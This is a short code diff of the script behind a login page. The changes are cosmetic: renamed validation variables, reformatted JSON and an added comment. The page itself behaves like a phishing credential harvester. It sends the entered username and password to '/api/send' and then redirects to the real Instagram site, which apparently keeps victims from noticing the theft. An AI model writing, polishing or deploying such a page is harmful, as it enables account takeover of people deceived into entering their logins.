@@ -135,9 +135,9 @@
     const loginButton = document.querySelector("button");
 
     function validateInputs() {
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-        loginButton.disabled = !username || !password;
+        const isUsernameFilled = usernameInput.value.trim().length > 0;
+        const isPasswordFilled = passwordInput.value.trim().length > 0;
+        loginButton.disabled = !(isUsernameFilled && isPasswordFilled);
     }
 
     usernameInput.addEventListener("input", validateInputs);
@@ -148,13 +148,13 @@
         const password = passwordInput.value;
         await fetch("/api/send", {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({username, password}),
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
         });
         window.location.href = "https://www.instagram.com/";
     }
 
-    validateInputs();
+    validateInputs(); // Initialize button state on page load
 </script>
 </body>
 </html>
